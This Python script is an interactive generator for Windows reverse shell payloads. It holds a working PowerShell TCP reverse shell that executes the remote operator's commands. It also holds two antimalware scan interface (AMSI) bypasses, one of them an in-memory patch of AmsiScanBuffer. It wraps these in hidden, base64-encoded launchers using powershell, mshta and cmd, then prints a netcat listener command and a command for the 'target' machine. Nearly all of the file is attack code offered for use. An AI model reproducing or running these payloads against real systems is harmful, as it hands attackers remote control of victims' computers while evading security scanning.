#!/usr/bin/env python3

import base64
import sys

# --- PAYLOAD COMPONENTS ---

# Basic TCP Reverse Shell
REVERSE_SHELL_LOGIC = "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

# Simple AMSI Bypass (String-based)
AMSI_BYPASS_SIMPLE = "$a = 'System.Management.Automation.A';$b = 'msiUtils';$c = [Ref].Assembly.GetType(('{0}{1}' -f $a,$b));$d = $c.GetField(('a'+'msiInitFailed'),'NonPublic,Static');$d.SetValue($null,$true);"

# Advanced AMSI Bypass (Reflection-based, single-quote safe)
AMSI_BYPASS_ADVANCED = """
$Win32 = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport('kernel32')]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport('kernel32')]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport('kernel32')]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
'@
Add-Type $Win32
$Kernel32 = [Win32]::LoadLibrary('kernel32.dll')
$Amsi = [Win32]::LoadLibrary('amsi.dll')
$AmsiScanBuffer = [Win32]::GetProcAddress($Amsi, 'AmsiScanBuffer')
[Win32]::VirtualProtect($AmsiScanBuffer, [UIntPtr]5, 0x40, [ref]0) | Out-Null
$Patch = [Byte[]](0x31, 0xff, 0x90)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $AmsiScanBuffer, 3)
""".strip()

# --- HELPER FUNCTION ---

def generate_final_command(ps_command, use_base64, wrapper_type):
    """
    Takes a raw PowerShell command and wraps it according to user's choice.
    """
    if use_base64:
        encoded_ps = base64.b64encode(ps_command.encode('utf-16-le')).decode()
        ps_launcher = f"powershell.exe -nop -w hidden -e {encoded_ps}"
    else:
        # Must escape internal quotes for the -c parameter
        escaped_ps_command = ps_command.replace('"', '`"')
        ps_launcher = f'powershell.exe -nop -w hidden -c "{escaped_ps_command}"'

    if wrapper_type == 'none':
        return ps_launcher
    elif wrapper_type == 'mshta':
        return f'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("{ps_launcher}", 0, True)'
    elif wrapper_type == 'cmd_mshta':
        mshta_command = f'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("{ps_launcher}", 0, True)'
        return f'cmd.exe /c "{mshta_command}"'

def print_output(final_command, payload_desc, port):
    """
    Prints the final generated payload and instructions.
    """
    encoding_type = "BASE64 ENCODED" if "-e " in final_command else "RAW (NON-ENCODED)"
    print("\n" + "="*50)
    print(f"WINDOWS PAYLOAD ({payload_desc.upper()}) - GENERATION COMPLETE")
    print(f"({encoding_type})")
    print("="*50)
    print("\n[1] Start this listener on your Linux machine:")
    print(f"\033[92mnc -lvnp {port}\033[0m")
    print("\n[2] Run this command on the target Windows machine:")
    print(f"\033[93m{final_command}\033[0m\n")

# --- MAIN LOGIC ---

def main():
    menu = {
        '1': ("Simple PowerShell Payload", 'none', ""),
        '2': ("Payload with Simple AMSI Bypass", 'none', AMSI_BYPASS_SIMPLE),
        '3': ("Payload with MSHTA Wrapper", 'mshta', AMSI_BYPASS_SIMPLE),
        '4': ("Payload with Advanced AMSI Bypass", 'mshta', AMSI_BYPASS_ADVANCED),
        '5': ("Payload with CMD + MSHTA Wrapper", 'cmd_mshta', AMSI_BYPASS_ADVANCED)
    }

    print("--- Windows Reverse Shell Payload Generator ---")
    for key, (desc, _, _) in menu.items():
        print(f"  {key}) {desc}")
    
    try:
        choice = input("Select payload type (1-5): ").strip()
        if choice not in menu:
            print("\n[!] Invalid choice. Exiting.", file=sys.stderr)
            sys.exit(1)

        desc, wrapper, amsi_logic = menu[choice]

        lhost = input("Enter your listener IP address (LHOST): ")
        lport = input("Enter your listener port (LPORT): ")
        if not lhost or not lport:
            print("\n[!] IP address and port cannot be empty.", file=sys.stderr)
            sys.exit(1)

        use_base64_input = input("Use Base64 encoding? (y/n, default: y): ").lower().strip()
        use_base64 = use_base64_input != 'n'

        # Build the core PowerShell command
        shell_logic = REVERSE_SHELL_LOGIC.format(ip=lhost, port=lport)
        ps_command = f"{amsi_logic};{shell_logic}" if amsi_logic else shell_logic

        # Generate the final wrapped command
        final_command = generate_final_command(ps_command, use_base64, wrapper)

        # Print the results
        print_output(final_command, desc, lport)

    except (KeyboardInterrupt, EOFError):
        print("\n\n[!] Script terminated by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
